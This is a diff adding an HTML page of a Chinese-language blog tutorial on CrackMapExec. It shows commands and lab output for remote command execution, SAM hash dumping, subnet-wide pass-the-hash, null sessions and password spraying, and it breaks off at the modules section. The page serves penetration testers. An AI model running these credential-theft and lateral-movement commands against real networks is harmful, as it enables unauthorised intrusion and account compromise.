@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="CrackMapExec(又名CME)是一个后渗透工具，帮助自动评估大型活动目录网络的安全性。CME采用了“自给自足”的概念:滥用内置的Active Directory特性&#x2F;协议来实现它的功能，并允许它逃避大多数端点保护&#x2F;id&#x2F;IPS 解决方案。 虽然CME主要用于进攻目的(例如红队)，但蓝队也可以使用CME来评估帐户权限，查找可能的错误配置和模拟攻击场景。 Crac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="crackmapexec终极指南">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/12/14/crackmapexec/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="CrackMapExec(又名CME)是一个后渗透工具，帮助自动评估大型活动目录网络的安全性。CME采用了“自给自足”的概念:滥用内置的Active Directory特性&#x2F;协议来实现它的功能，并允许它逃避大多数端点保护&#x2F;id&#x2F;IPS 解决方案。 虽然CME主要用于进攻目的(例如红队)，但蓝队也可以使用CME来评估帐户权限，查找可能的错误配置和模拟攻击场景。 Crac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme_discovery.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme4.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme5.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme9.png">
+<meta property="article:published_time" content="2020-12-14T10:51:19.000Z">
+<meta property="article:modified_time" content="2020-12-14T16:05:35.713Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="crackmapexec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme1.png">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/12/14/crackmapexec/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/12/14/crackmapexec/","path":"2020/12/14/crackmapexec/","title":"crackmapexec终极指南"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>crackmapexec终极指南 | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">网络发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">执行方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">4.</span> <span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%B7%B2%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7"><span class="nav-number">5.</span> <span class="nav-text">检查已登录的用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%AD%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">凭据攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dump%E6%9C%AC%E5%9C%B0sam-hash"><span class="nav-number">6.1.</span> <span class="nav-text">dump本地sam hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash%E4%BC%A0%E9%80%92"><span class="nav-number">6.2.</span> <span class="nav-text">hash传递</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E5%AD%90%E7%BD%91hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="nav-number">6.3.</span> <span class="nav-text">对子网hash传递攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E4%BC%9A%E8%AF%9D"><span class="nav-number">6.4.</span> <span class="nav-text">空会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E5%92%8C%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="nav-number">6.5.</span> <span class="nav-text">爆破和密码喷射</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97"><span class="nav-number">7.</span> <span class="nav-text">模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E6%A8%A1%E5%9D%97"><span class="nav-number">8.</span> <span class="nav-text">使用一个模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97-MimiKatz"><span class="nav-number">9.</span> <span class="nav-text">模块 - MimiKatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97-Enum-Chrome"><span class="nav-number">10.</span> <span class="nav-text">模块 - Enum_Chrome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8CrackMapExec%E6%9D%A5get-shell"><span class="nav-number">11.</span> <span class="nav-text">使用CrackMapExec来get shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit"><span class="nav-number">11.1.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Empire"><span class="nav-number">11.2.</span> <span class="nav-text">Empire</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Empire-amp-DeathStar-%E8%81%94%E5%8A%A8"><span class="nav-number">12.</span> <span class="nav-text">Empire &amp; DeathStar 联动</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/12/14/crackmapexec/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="crackmapexec终极指南 | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          crackmapexec终极指南
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-12-14 18:51:19" itemprop="dateCreated datePublished" datetime="2020-12-14T18:51:19+08:00">2020-12-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-12-15 00:05:35" itemprop="dateModified" datetime="2020-12-15T00:05:35+08:00">2020-12-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/kali%E4%B8%8B%E7%9A%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">kali下的工具使用</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>CrackMapExec(又名CME)是一个后渗透工具，帮助自动评估大型活动目录网络的安全性。CME采用了“自给自足”的概念:滥用内置的Active Directory特性&#x2F;协议来实现它的功能，并允许它逃避大多数端点保护&#x2F;id&#x2F;IPS 解决方案。</p>
+<p>虽然CME主要用于进攻目的(例如红队)，但蓝队也可以使用CME来评估帐户权限，查找可能的错误配置和模拟攻击场景。</p>
+<p>CrackMapExec由<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9ieXQzYmwzM2Qzcg==">@byt3bl33d3r<i class="fa fa-external-link-alt"></i></span>开发，For installation Check the <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0NyYWNrTWFwRXhlYy8=">GitHub Repo<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme1.png"></li>
+</ul>
+<span id="more"></span>
+
+<h2 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h2><p>找出网络上有什么:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme_discovery.gif"></li>
+</ul>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在windows系统上执行命令需要管理员凭据，当身份验证成功时，CME通过在输出中追加’(Pwn3d!)’，自动告诉您正在使用的凭据集是否对主机具有管理员访问权限。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme2.png"></li>
+</ul>
+<h2 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h2><p>CME有三种不同的命令执行方法:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec executes commands via WMI</span><br><span class="line">atexec executes commands by scheduling a task with windows task scheduler</span><br><span class="line">smbexec executes commands by creating and running a service</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，如果一个执行方法失败，CME将故障转移到另一个执行方法。它尝试按以下顺序执行命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec</span><br><span class="line">atexec</span><br><span class="line">smbexec</span><br></pre></td></tr></table></figure>
+
+<p>如果希望强制CME只使用一个执行方法，可以使用-execute-method标志指定哪个执行方法。</p>
+<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>在下面的例子中，尝试使用-x flag在目标上执行whoami:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#~ crackmapexec 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -x whoami</span></span><br><span class="line">06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)</span><br><span class="line">06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)</span><br><span class="line">06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         [+] Executed <span class="built_in">command</span> </span><br><span class="line">06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         lab\administrator</span><br><span class="line">06-05-2016 14:34:39 [*] KTHXBYE!</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme3.png"></li>
+</ul>
+<p>还可以直接使用-X flag执行PowerShell命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#~ crackmapexec 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -X &#x27;$PSVersionTable&#x27;</span></span><br><span class="line">06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)</span><br><span class="line">06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         [+] Executed <span class="built_in">command</span> </span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         Name                           Value</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         ----                           -----</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSVersion                      2.0</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           &#123;1.0, 2.0&#125;</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1</span><br><span class="line">06-05-2016 14:36:10 [*] KTHXBYE!</span><br></pre></td></tr></table></figure>
+
+<h2 id="检查已登录的用户"><a href="#检查已登录的用户" class="headerlink" title="检查已登录的用户"></a>检查已登录的用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec 192.168.215.104 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;PASS&#x27;</span> --lusers</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme4.gif"></li>
+</ul>
+<h2 id="凭据攻击"><a href="#凭据攻击" class="headerlink" title="凭据攻击"></a>凭据攻击</h2><h3 id="dump本地sam-hash"><a href="#dump本地sam-hash" class="headerlink" title="dump本地sam hash"></a>dump本地sam hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec 192.168.215.104 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;PASS&#x27;</span> --local-auth --sam</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme5.gif"></li>
+</ul>
+<h3 id="hash传递"><a href="#hash传递" class="headerlink" title="hash传递"></a>hash传递</h3><p>CME支持通过SMB使用-H标志传递哈希攻击进行身份验证:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb &lt;target(s)&gt; -u username -H LMHASH:NTHASH</span><br><span class="line"></span><br><span class="line">crackmapexec smb &lt;target(s)&gt; -u username -H NTHASH</span><br></pre></td></tr></table></figure>
+
+<h3 id="对子网hash传递攻击"><a href="#对子网hash传递攻击" class="headerlink" title="对子网hash传递攻击"></a>对子网hash传递攻击</h3><p>通过admin + hash的smb登录到所有子网机器。通过使用-local-auth和找到的本地管理密码，可以使用该本地管理密码&#x2F;散列登录到启用smb的整个子网机器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 172.16.157.0/24 -u administrator -H <span class="string">&#x27;aad3b435b51404eeaa35b51404ee:5509de4ff0a6e8d9f4a61100e51&#x27;</span> --local-auth</span><br></pre></td></tr></table></figure>
+
+<h3 id="空会话"><a href="#空会话" class="headerlink" title="空会话"></a>空会话</h3><p>可以通过使用“作为用户名和&#x2F;或密码”来使用空会话登录<br>例子:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb &lt;target(s)&gt; -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破和密码喷射"><a href="#爆破和密码喷射" class="headerlink" title="爆破和密码喷射"></a>爆破和密码喷射</h3><p>可以通过指向子网和传递creds的crackmapexec来做到这一点:</p>
+<p>SMB的例子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec 10.0.2.0/24 -u ‘admin’ -p ‘P@ssw0rd<span class="string">&#x27; </span></span><br></pre></td></tr></table></figure>
+
+<p>所有协议都支持暴力破解和密码喷洒。有关使用特定协议强制使用暴力破解&#x2F;密码喷洒的详细信息，请参阅相应的wiki部分。</p>
+<p>通过指定文件或多个值CME将自动暴力登录为所有目标使用指定的协议:</p>
+<p>例子:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 -p password1 password2</span><br><span class="line"></span><br><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1</span><br><span class="line"></span><br><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -p ~/file_containing_passwords</span><br><span class="line"></span><br><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes</span><br></pre></td></tr></table></figure>
+
+<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>从v3.1开始，模块的加载和使用方式发生了变化，以使CME的可移植性更强，并允许对其进行打包。</p>
+<p>在v4.0中，每个协议现在都可以拥有自己的模块集(好玩好玩好玩!)</p>
